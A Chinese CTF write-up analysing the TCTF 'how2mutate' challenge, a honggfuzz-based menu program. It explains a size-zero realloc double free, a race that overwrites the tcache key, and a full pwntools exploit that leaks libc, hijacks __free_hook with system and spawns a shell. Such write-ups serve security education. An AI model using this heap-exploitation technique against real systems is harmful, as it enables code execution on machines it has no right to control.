> 原文链接: https://www.anquanke.com//post/id/248728 


# TCTF线上赛how2mutate学习条件竞争DoubleFree的利用


                                阅读量   
                                **31581**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0199b86ee43d44c272.png)](https://p2.ssl.qhimg.com/t0199b86ee43d44c272.png)



how2mutate这个题目给出了源码，是一个结合honggfuzz开源项目的题目。虽然看起来比较复杂，但是其实就是一个菜单题目，仔细分析一下就可以找到漏洞。

## 分析

这里我们先看一下题目的描述

```
using honggfuzz commit 7eecfc991d0ae540d9773a6feb8fac5012a55ed6

remote server is newest Ubuntu:20.04 docker (IMAGE ID 9873176a8ff5) . find the libs yourself :)
```

这里我首先是搜索了一下7eecfc991d0ae540d9773a6feb8fac5012a55ed6这个commit

[![](https://p2.ssl.qhimg.com/t01043538aa0752b3ba.png)](https://p2.ssl.qhimg.com/t01043538aa0752b3ba.png)

导致一开始我以为这是一个溢出的漏洞。😅

这里我们首先看一下main函数

```
seeds = (uint8_t **)util_Calloc(8*16);
puts(menu);
while (1) `{`
    printf("&gt; ");
    read(0, buf, 4);
    if (buf[0] == '1') `{`
        add_seed();
    `}` else if (buf[0] == '2') `{`
        mutate_seed();
    `}` else if (buf[0] == '3') `{`
        show_seed();
    `}` else if (buf[0] == '4') `{`
        delete_seed();
    `}` else if (buf[0] == '5') `{`
        set_mutate();
    `}` else if (buf[0] == '6') `{`
        subproc_runThread(&amp;hfuzz, &amp;fuzzthread, tofuzz, false);
    `}` else `{`
        break;
    `}`
`}`
```

前面的部分不太重要，这里只选取了一些重要的部分。也就是可以看到这里有6个功能，分别是add，mutate，show，delete，set_mutate以及fuzz。我们依次看一下，首先是add函数

```
void add_seed() `{`
    int i=0;
    while (i&lt;10 &amp;&amp; seeds[i]) i++;
    if (i&lt;10) `{`
        printf("size: ");
        scanf("%d", &amp;seedssz[i]);
        int sz = seedssz[i]+1;
        if (sz&gt;0 &amp;&amp; sz&lt;0x8000) `{`
            printf("content: ");
            seeds[i] = util_Calloc(sz);
            read(0, seeds[i], seedssz[i]);
        `}`
    `}`
`}`
```

这里可以看到我们一共可以申请10个seed，其中size的大小是我们可以进行控制的。函数会按照我们输入的size调用util_Calloc函数申请size+1大小的内存空间，将得到的buf地址存储到seeds数组中，并将我们输入的size的值存储在seedssz数组中。注意到这里我们输入的size是可以为0的。

来看一下util_Calloc函数，这个是honggfuzz自己封装实现的内存分配函数

```
void* util_Realloc(void* ptr, size_t sz) `{`
    void* ret = realloc(ptr, sz);
    if (ret == NULL) `{`
        PLOG_W("realloc(%p, %zu)", ptr, sz);
        free(ptr);
        return NULL;
    `}`
    return ret;
`}`
```

那么这里很明显的存在一个漏洞，也就是传入的参数sz=0的时候，realloc的实际作用就相当于是free函数，返回值为NULL，将ptr指向的内存空间free掉之后，会进入之后的if分支，可以看到这里再一次free掉了ptr内存指针。也就是存在一个DoubleFree的漏洞。但是正常情况下这个漏洞没办法利用，因为这里的环境是20.04的环境，也就是对tcache的double free进行了检查。但是这里传入的参数是sz，也就是size+1，即add函数中无法触发这个漏洞。

我们继续向下分析。

```
void mutate_seed() `{`
    char buf[16];
    printf("index: ");
    read(0, buf, 4);
    if (buf[0]&gt;='0' &amp;&amp; buf[0]&lt;='9') `{`
        int idx = buf[0]-'0';
        if (seeds[idx]) `{`
            run.dynfile-&gt;size = seedssz[idx];
            memcpy(run.dynfile-&gt;data, seeds[idx], seedssz[idx]);
            mangle_mangleContent(&amp;run, 1);
            seedssz[idx] = run.dynfile-&gt;size;
            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
            memcpy(seeds[idx], run.dynfile-&gt;data, seedssz[idx]);
        `}`
    `}`
`}`
```

这个函数其实就是一个种子变异的函数。函数首先根据我们指定index将对应的种子的内容拷贝到run.dynfile-&gt;data函数中，之后调用mangle_mangleContent函数，我们可以结合honggfuzz分析一下这个函数，从分析可以得出这个函数的功能是执行种子的变异，我们看一下前半段的内容。

```
void mangle_mangleContent(run_t* run, int speed_factor) `{`
    static void (*const mangleFuncs[])(run_t * run, bool printable) = `{`
        mangle_Shrink,
        mangle_Expand,
        mangle_Bit,
        mangle_IncByte,
        mangle_DecByte,
        mangle_NegByte,
        mangle_AddSub,
        mangle_MemSet,
        mangle_MemClr,
        mangle_MemSwap,
        mangle_MemCopy,
        mangle_Bytes,
        mangle_ASCIINum,
        mangle_ASCIINumChange,
        mangle_ByteRepeat,
        mangle_Magic,
        mangle_StaticDict,
        mangle_ConstFeedbackDict,
        mangle_RandomBuf,
        mangle_Splice,
    `}`;

    if (run-&gt;mutationsPerRun == 0U) `{`
        return;
    `}`
//...
`}`
```

可以看到这里如果run-&gt;mutationsPerRun为0的话，那么就直接返回不在执行之后的种子变异的操作。而这个成员变量我们可以通过set_mutate函数来进行设置

```
void set_mutate() `{`
    char buf[16];
    printf("mutationsPerRun: ");
    read(0, buf, 4);
    if (buf[0]&gt;='0' &amp;&amp; buf[0]&lt;='9') `{`
        int x = buf[0]-'0';
        hfuzz.mutate.mutationsPerRun = x;
        run.mutationsPerRun = x;
    `}`
`}`
```

这里如果我们输入0的话，那么就会关闭种子变异的功能。继续分析一下mutate_seed函数，当mangle_mangleContent函数执行结束之后我们发现其再次调用了util_Realloc函数

```
seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
memcpy(seeds[idx], run.dynfile-&gt;data, seedssz[idx]);
```

那么这里函数传入的参数就是seedssz[idx]，也就是我们输入的size，是可以为0的，也就是这里是可以触发漏洞的。触发完毕漏洞之后会执行memcpy函数，这里的seeds[idx]的值就变为了0，但是由于seedssz[idx]的值也是0，因此这里不会报错。



## 条件竞争

在找到漏洞之后接下来就是如何利用的问题，由于20.04开启了tcache keys对tcache的double free进行了检测，因此这里我们还需要找到一种方法来对keys进行覆写。我们继续分析之后的函数，也就是可以对buf进行覆写的函数，并且这个函数要单独的执行一个线程，这样才能够在两次free中间进行覆写keys构造出double free。妥妥的条件竞争。

这里注意到在main函数的菜单中，fuzz功能是通过重新启动一个线程来完成的。

```
subproc_runThread(&amp;hfuzz, &amp;fuzzthread, tofuzz, false);
static void* tofuzz(void* arg) `{`
    for (int c=0; c&lt;0xffffff; c++) `{`
        for (int i=0; i&lt;10; i++)
            if (seeds[i]) `{`
                fuzzone(seeds[i]);
            `}`
    `}`
`}`
```

tofuzz的功能是对存在的没个seed执行fuzzone的调用。而fuzzone函数则是根据我们输入的种子的内容进行一个对buf的改写，看内容来说是进行路径的选择，重要的是这里会对buf[1:16]的内容进行改写，而tcache keys恰好就在偏移0x8的位置。

那么我们选择fuzzone的哪个路径呢。这里分析一下，我们想要的覆写keys的操作是在第一次free结束，第二次free开始之前完成。那么当第一次free结束之后，buf的前0x10就会被覆写，其中0-0x8会被覆写为tcache中下一个堆块的地址，而0x8-0x10会被覆写为keys的值。而注意到这里的堆地址一定是0x10对其的，因此这里的路径选择其实不多只能选择buf[0]=0的条件下的覆写，因为0的ascii码是0x30，只要我们布局合理就可以进入到这个路径中。

```
if (buf[0] == '0') `{`
    bool ok=true;
    for (i=2; i&lt;15; i++) `{`
        buf[i] -= buf[i-1];
        if (buf[i] != buf[i+1])
            ok = false;
    `}`
    if (ok)
        puts("path 9");
`}`
```

之后就会改写buf[1:16]的内容，也就是将keys改写，在第二次free的时候就会成功触发，构造出double free。

那么这里的竞争窗口有多大呢，我们再来看一下两次free的流程。

```
void* ret = realloc(ptr, sz);
if (ret == NULL) `{`
    PLOG_W("realloc(%p, %zu)", ptr, sz);
    free(ptr);
    return NULL;
`}`
```

两次free中间会执行一个条件判断和一个日志输入，终点就是这个日志输出函数，这里的执行时间还是挺长的，竞争窗口很大，条件竞争构造DoubleFree可行。



## 利用

那么接下来就是DoubleFree的利用了。这里的DoubleFree很明显的可以转化为任意地址分配。

那么首先需要进行的就是地址泄漏，在本地调试的时候进行日志输出也就是PLOG_W函数执行的时候会进行一系列的地址分配，完成输出之后会残留有一个unsorted bin堆块，并且如果在add_seed函数中调用的话，最后还会输出一个堆地址，那么利用上述的地址分配到unsorted bin地址处就可以完成libc的地址泄漏了。

但是远程的环境与本地不同，并没有残留有unsorted bin的堆块，因此只能够提前部署一个unsorted bin的堆块进行libc地址的泄漏，之后再任意地址分配覆写free_hook为system

完整的exp如下

```
# -*- coding: utf-8 -*-
from pwn import *

file_path = "./how2mutate"
context.arch = "amd64"
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(file_path)
debug = 0
if debug:
    p = process([file_path])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

else:
    p = remote('111.186.59.27', 12345)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadget = 0x0

def add_seed(size, content=b"\n"):
    p.sendlineafter("&gt; ", "1")
    p.sendlineafter("size: ", str(size))
    if size &gt; 0:
        p.sendafter("content: ", content)

def mutate_seed(index):
    p.sendlineafter("&gt; ", "2")
    p.sendlineafter("index: ", str(index))

def show_seed():
    p.sendlineafter("&gt; ", "3")

def delete_seed(index):
    p.sendlineafter("&gt; ", "4")
    p.sendlineafter("index: ", str(index))

def set_mutate(mutate):
    p.sendlineafter("&gt; ", "5")
    p.sendlineafter("mutationsPerRun: ", str(mutate))

def fuzz():
    p.sendlineafter("&gt; ", "6")

heap_address = 0
set_mutate(0)

for i in range(1):
    add_seed(0x17, b"a" * 0x17)

for i in range(1):
    delete_seed(i)

add_seed(0)  # 0
mutate_seed(0)
p.recvuntil("realloc(")
heap_address = int(p.recvuntil(",", drop=True), 16)
log.success("heap address is `{``}`".format(hex(heap_address)))

add_seed(0x17, b"a" * 0x17)  # 0
if debug:
    add_seed(0x70 + 0x400, b"a")  # 1
else:
    add_seed(0x80 + 0x400, b"a")  # 1

add_seed(0x17, b"a" * 0x17)  # 2

delete_seed(1)  # unsorted bin # 0x5a0
delete_seed(2)
delete_seed(0)  # 0x3a0

if debug:
    gdb.attach(p, "b *$rebase(0x7000)\nb *$rebase(0x1FB90)")
    log.success("heap address is `{``}`".format(hex(heap_address)))
    log.success("libc address is `{``}`".format(hex(libc.address)))
fuzz()

add_seed(0)

mutate_seed(0)

if debug:
    show_address = heap_address + 0x8f0 + 0x50

else:
    show_address = heap_address + 0x3a0

add_seed(0x10, p64(show_address))  # 0
add_seed(0x8, b"a")  # 1
add_seed(0x8, b"a")  # 2
add_seed(0x40, b"a")  # 3
log.success("show address is `{``}`".format(hex(show_address)))

show_seed()
p.recvuntil("2: ")
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success("libc address is `{``}`".format(hex(libc.address)))

add_seed(0x8, b"a" * 0x8)  # 4 = 2
if debug:
    add_seed(0x20, b"/bin/sh\x00")  # 5
    add_seed(0x20, b"/bin/sh\x00")  # 6
else:
    add_seed(0xc0, b"/bin/sh\x00")  # 5
add_seed(0x8, b"a" * 0x8)  # 6

if debug:
    delete_seed(6)
else:
    delete_seed(7)
fuzz()
delete_seed(4)
delete_seed(2)
add_seed(0x8, p64(libc.sym['__free_hook']))  # 3
add_seed(0x8, b"/bin/sh\x00")  # 5
add_seed(0x8, p64(libc.sym['system']))  # 7

delete_seed(5)

p.interactive()
```
